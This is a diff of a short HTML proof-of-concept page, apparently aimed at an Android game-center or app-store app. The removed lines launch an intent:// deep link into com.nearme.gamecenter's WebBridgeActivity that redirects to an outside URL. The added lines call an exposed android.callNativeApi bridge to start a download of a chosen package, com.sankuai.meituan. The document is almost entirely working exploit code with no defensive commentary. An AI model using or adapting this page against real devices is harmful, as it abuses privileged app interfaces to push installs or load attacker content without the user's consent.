@@ -1,16 +1,28 @@
-<!DOCTYPE html>
 <html>
-<head>
+
+<header>
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+</header>
+
 <script>
-function myFunction()
-{
-    window.location.href='intent://gc/ntf/trampoline?key_jump_url=https%3A%2F%2Fcqupt-wmh.github.io%2F2019%2F10%2F10%2Fwp%2F&_wrapper_type=check_game_time_notification#Intent;scheme=oaps;component=com.nearme.gamecenter/com.cdo.oaps.host.old.WebBridgeActivity;end';
-}
+    function start() {
+        var json = {
+            'type': 'download_start',
+            'json': {
+                'pkg': 'com.sankuai.meituan',
+                'id': 1122334
+            }
+        }
+        android.callNativeApi(JSON.stringify(json));
+    }
 </script>
-</head>
+
 <body>
-
-<input type="button" onclick="myFunction()" value="显示警告框">
-
+    <br />
+    <input type="button" class="btn" onclick="start()" value="start" />
+    <br />
 </body>
+
 </html>
